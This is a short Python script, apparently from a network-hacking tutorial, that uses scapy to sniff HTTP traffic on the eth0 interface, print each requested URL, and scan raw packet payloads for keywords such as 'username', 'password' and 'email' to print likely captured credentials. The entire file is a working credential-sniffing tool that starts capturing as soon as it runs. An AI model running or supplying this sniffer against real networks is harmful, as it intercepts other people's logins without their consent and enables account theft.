import scapy.all as scapy
# from scapy.layers import http
import scapy_http.http as http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_process_sniffer)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    keywords = ["username", "user", 'login', 'email', 'password', 'pass']
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        for keyword in keywords:
            if keyword in load:
                return "\n\n[+] Possible username/password >> " + str(load) + "\n\n\n"


def packet_process_sniffer(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + str(url))
        login_info = get_login_info(packet)
        if login_info:
            print(login_info)



sniff('eth0')
